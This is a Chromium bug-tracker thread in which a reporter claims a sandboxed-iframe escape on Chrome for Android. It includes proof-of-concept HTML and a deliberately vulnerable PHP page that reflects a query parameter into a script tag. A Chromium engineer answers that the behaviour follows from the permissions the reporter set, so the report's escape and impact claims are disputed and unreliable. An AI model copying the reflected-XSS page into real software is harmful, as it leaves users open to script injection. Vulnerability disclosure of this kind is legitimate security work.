@@ -1,0 +1,185 @@
+Issue ID: 441900749
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<h3>1. <code>a.html</code> or <code>index.html</code></h3>
+<pre><code>&lt;<span class="stx-keyword">iframe</span> sandbox=<span class="stx-string">&quot;allow-popups allow-same-origin allow-scripts allow-modals&quot;</span> src=<span class="stx-string">&quot;sandbox.html&quot;</span>&gt;&lt;/<span class="stx-keyword">iframe</span>&gt;
+</code></pre>
+<h3>2. <code>sandbox.html</code></h3>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+  &lt;<span class="stx-keyword">body</span>&gt;
+    &lt;<span class="stx-keyword">iframe</span> name=<span class="stx-string">&quot;b&quot;</span>&gt;&lt;/<span class="stx-keyword">iframe</span>&gt;
+    &lt;<span class="stx-keyword">script</span>&gt;
+      b.open(<span class="stx-string">&#39;http://localhost:8000/xss.php?js=alert(1)&#39;</span>);
+    &lt;/<span class="stx-keyword">script</span>&gt;
+  &lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<h3>3. <code>xss.php</code></h3>
+<pre><code>&lt;?php
+$js = $_GET[&#39;js&#39;] ?? &#39;&#39;;
+header(&#39;Content-Type: text/html&#39;);
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      &lt;?= $js ?&gt;
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3>4. Start a Local Server</h3>
+<p>Run the following command in your terminal:</p>
+<pre><code>php -S localhost:8000
+</code></pre>
+<h3>5. Navigate to:</h3>
+<pre><code>http://localhost:8000/a.html
+</code></pre>
+<ul>
+<li>Make sure to <strong>allow the popup</strong> when prompted by the browser.</li>
+</ul>
+<h3>6. Result:</h3>
+<p>A <strong>new tab opens</strong> and <code>alert(1)</code> executes, demonstrating a <strong>sandbox escape</strong> — even though <code>allow-popups-to-escape-sandbox</code> is <strong>not</strong> set.</p>
+<h2>Live Server:</h2>
+<ul>
+<li>I have verified this issue using a live server. For quicker reproduction, please visit: <a href="https://attacker.hackerbro.net/a.html" data-b-widget="url" data-b-original-href="https://attacker.hackerbro.net/a.html" data-b-redirected-href="https://www.google.com/url?q=https://attacker.hackerbro.net/a.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3LVzUO4yjoi8cqCLqwyVbk">https://attacker.hackerbro.net/a.html</a></li>
+</ul>
+<h2>Recommendations:</h2>
+<ul>
+<li>Enforce <strong>strict sandbox policy compliance</strong> across all Chromium versions.</li>
+<li>Ensure <strong>popups opened by sandboxed iframes</strong> inherit the sandbox <strong>unless</strong> <code>allow-popups-to-escape-sandbox</code> is explicitly set.</li>
+<li>Prevent popups from <strong>bypassing global popup-block settings</strong> through programmatic iframe-based navigation.</li>
+</ul>
+<h1>Problem Description</h1>
+<ul>
+<li>A <strong>sandbox escape vulnerability</strong> exists in **Chrome Stable , Chrome  Canary, Chrome Beta for Android **, which allows JavaScript to execute <strong>outside</strong> the sandboxed iframe constraints <strong>without</strong> using <code>allow-popups-to-escape-sandbox</code> or <code>allow-modals</code>. This issue results in <strong>Universal Cross-Site Scripting (UXSS)</strong>.</li>
+<li>The same payload <strong>fails</strong> in Chrome for <strong>macOS</strong>, confirming that the issue is <strong>Android-specific</strong> (iOS not verified).</li>
+</ul>
+<h2>Test Environment:</h2>
+<ul>
+<li>Chrome Stable 139.0.7258.158</li>
+<li>Chrome Beta 140.0.7339.25</li>
+<li>Chrome Canary 141.0.7377.0</li>
+<li><strong>Operating System:</strong> Android</li>
+</ul>
+<p><strong>Not Affected:</strong></p>
+<ul>
+<li>Chrome for <strong>macOS</strong> Desktop (tested and confirmed)</li>
+</ul>
+<h2>Proof of Concept:</h2>
+<ul>
+<li>A proof of concept <strong>video</strong> has been uploaded in this report for your review and reference.</li>
+</ul>
+<h2>Security Impact:</h2>
+<ul>
+<li>Execute scripts <strong>cross-origin</strong></li>
+<li>Bypass <strong>same-origin policy</strong></li>
+<li>Perform <strong>phishing</strong> or <strong>clickjacking</strong></li>
+<li><strong>Steal</strong> or <strong>manipulate</strong> sensitive data from isolated contexts</li>
+<li><strong>Escalate privileges</strong> within sandboxed or isolated environments</li>
+</ul>
+<h1>Summary</h1>
+<p>Sandbox Escape via <code>&lt;iframe&gt;</code> Without <code>allow-modals</code> &amp; <code>allow-popups-to-escape-sandbox</code></p>
+<h1>Custom Questions</h1>
+<h4>Reporter credit:</h4>
+<p>Manojkumar Jaganathan (<a href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-widget="url" data-b-original-href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-redirected-href="https://www.google.com/url?q=https://www.linkedin.com/in/manojkumar-j-7ba35b202/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3yGYjbAkUBzQSSXE1f3oDi">https://www.linkedin.com/in/manojkumar-j-7ba35b202/</a>) Aka TheWhiteEvil (<a href="https://hackerone.com/the-white-evil" data-b-widget="url" data-b-original-href="https://hackerone.com/the-white-evil" data-b-redirected-href="https://www.google.com/url?q=https://hackerone.com/the-white-evil&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2KREOzR1YCNOgjcFd19Ov8">https://hackerone.com/the-white-evil</a>) with HackerBro Technologies</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: N/A \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: bu...@gmail.com
+Sandbox Escape via `<iframe>` Without `allow-modals` & `allow-popups-to-escape-sandbox`
+
+Author: bu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: bu...@gmail.com
+<h2>Sandbox Escape Behavior – Chrome for Android vs Desktop</h2>
+<ul>
+<li>When you open <code>a.html</code>, it loads an <code>&lt;iframe&gt;</code> that contains <code>sandbox.html</code>. <code>sandbox.html</code> attempts to open <code>xss.php</code> in a <strong>named iframe</strong> and execute JavaScript (JS) from the URL.</li>
+</ul>
+<h2>Expected Behavior:</h2>
+<ul>
+<li>If the <strong>sandbox is functioning correctly</strong>, the JavaScript should <strong>not execute</strong> due to sandbox restrictions.</li>
+</ul>
+<h3>Observed Behavior on Chrome for Android:</h3>
+<ul>
+<li>
+<p>On <strong>Chrome for Android</strong>, the sandbox restrictions are <strong>bypassed</strong>, allowing the JavaScript to <strong>successfully execute</strong>.</p>
+</li>
+<li>
+<p>This occurs <strong>without</strong> the use of the following attributes:</p>
+</li>
+<li>
+<p><code>allow-modals</code></p>
+</li>
+<li>
+<p><code>allow-popups-to-escape-sandbox</code></p>
+</li>
+</ul>
+<h2>Observed Behaviour on Chrome for macOS (Desktop):</h2>
+<ul>
+<li>
+<p>On <strong>Chrome for macOS</strong>, the JavaScript <strong>does not execute</strong>, as the sandbox <strong>is not escaped</strong>.</p>
+</li>
+<li>
+<p>The <strong>Developer Console</strong> logs the following messages:</p>
+</li>
+<li>
+<p>&quot;An iframe which has both <code>allow-scripts</code> and <code>allow-same-origin</code> for its sandbox attribute can escape its sandboxing.&quot;_</p>
+</li>
+<li>
+<p>&quot;xss.php?js=alert(1):5 Ignored call to &#39;alert()&#39;. The document is sandboxed, and the &#39;allow-modals&#39; keyword is not set.&quot;</p>
+</li>
+</ul>
+<h2>Summary:</h2>
+<ul>
+<li><strong>Chrome Android</strong>: Sandbox escape <strong>successful</strong>, JS executes without required attributes.</li>
+<li><strong>Chrome macOS</strong>: Sandbox <strong>enforced</strong>, JS blocked as expected.</li>
+<li>I have uploaded the proof of concept image and video in this report for your review and reference.</li>
+</ul>
+
+Author: bu...@gmail.com
+TkRReE9UQXdOelE1TFRZNE9EZzJOak0zTFRFNE9ERXdNRGs1T1RjPQ==
+
+Author: bu...@gmail.com
+TkRReE9UQXdOelE1TFRZNE9EZ3pOamc0TFRJeE1qRTRNVEE0TnpnPQ==
+
+Author: bu...@gmail.com
+<p>Typo* Do not include allow-modals <span>&lt;iframe sandbox=&quot;allow-popups allow-same-origin allow-scripts&quot; src=&quot;sandbox.html&quot;&gt;</span><span>&lt;/iframe&gt;</span></p>
+
+Author: li...@chromium.org
+<p>Your script sets <code>allow-popups</code> and <code>allow-scripts</code> which allows the iframe to execute javascript and open a new window. The new window inherits the sandbox permissions, which allows javasript, so it can also run javascript.</p>
+
+Author: li...@chromium.org
+public_non_google
+
+Author: li...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: bu...@gmail.com
+<p>Hi team, but it cannot be reproduced in firefox. Can you have a look into it once?</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
